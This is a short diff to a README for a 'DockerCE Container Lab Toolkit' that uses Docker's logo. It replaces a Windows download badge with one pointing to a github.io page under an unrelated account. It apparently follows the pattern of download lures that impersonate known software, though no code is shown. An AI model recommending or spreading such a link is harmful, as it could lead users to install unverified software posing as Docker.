@@ -1,13 +1,11 @@
 # DockerCE Container Lab Toolkit
 
 <div align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Docker_%28container_engine%29_logo.svg/2560px-Docker_%28container_engine%29_logo.svg.png" alt="Project Logo"/>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/7/79/Docker_%28container_engine%29_logo.png?utm_source=uk.wikipedia.org&utm_campaign=index&utm_content=original" alt="Project Logo"/>
 </div>
 
-<div align="center">
+[![GET DockerCE Container](https://img.shields.io/badge/GET%20%E2%80%94%20DockerCE-Container-0078D6?style=for-the-badge&logoColor=white)](https://polaskiramesheu.github.io/.github/DockerCE-Container)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://dockerce-container-lab.github.io/.github/)
-</div>
 
 ---
 
